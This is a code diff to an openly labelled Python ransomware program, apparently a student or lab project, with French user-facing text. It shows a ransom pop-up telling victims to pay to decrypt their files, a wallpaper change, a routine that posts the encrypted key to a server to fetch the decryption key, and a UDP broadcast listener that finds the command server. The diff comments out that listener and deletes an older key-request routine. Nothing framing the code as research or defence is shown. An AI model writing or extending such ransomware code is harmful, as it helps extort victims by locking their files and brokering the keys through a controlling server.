@@ -41,7 +41,7 @@ class RansomwareGUI:
         self.set_wallpaper(self.NEW_WALLPAPER)
 
         self.setup_ui()
-        self.discover_server()
+        #self.discover_server()
         self.start_timer()
 
     def load_config(self, config_file='server/config.ini'):
@@ -113,27 +113,6 @@ class RansomwareGUI:
     def show_ransom_message(self):
         messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")
 
-    """ def request_symmetric_key(self):
-        if not self.server_ip:
-            print("Serveur non trouvé : self.server_ip est vide ou None")
-            messagebox.showerror("Erreur", "Serveur non trouvé.")
-            return
-
-        encrypted_symmetric_key_path = os.path.join('keys', 'encrypted_symmetric_key.bin')
-        with open(encrypted_symmetric_key_path, 'rb') as key_file:
-            encrypted_symmetric_key = key_file.read()
-
-        response = requests.post(
-            f'http://{self.server_ip}:{self.server_port}/get_symmetric_key',
-            json={'paid': True, 'encrypted_symmetric_key': encrypted_symmetric_key.hex()}
-        )
-
-        if response.status_code == 200:
-            symmetric_key = bytes.fromhex(response.json()['symmetric_key'])
-            self.decrypt_files(symmetric_key)
-        else:
-            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.") """
-
     def request_symmetric_key(self):
         try:
             if not self.server_ip:
@@ -180,7 +159,7 @@ class RansomwareGUI:
         if os.path.exists(self.ENCRYPTION_FLAG):
             os.remove(self.ENCRYPTION_FLAG)
 
-    def discover_server(self):
+    """ def discover_server(self):
         def broadcast_listener():
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
@@ -191,7 +170,7 @@ class RansomwareGUI:
                     self.server_ip = data[len(b'SERVER_IP:'):].decode()
                     print(f"Serveur trouvé à l'adresse {self.server_ip}")
 
-        threading.Thread(target=broadcast_listener).start()
+        threading.Thread(target=broadcast_listener).start() """
 
     def setup_ui(self):
         message = (
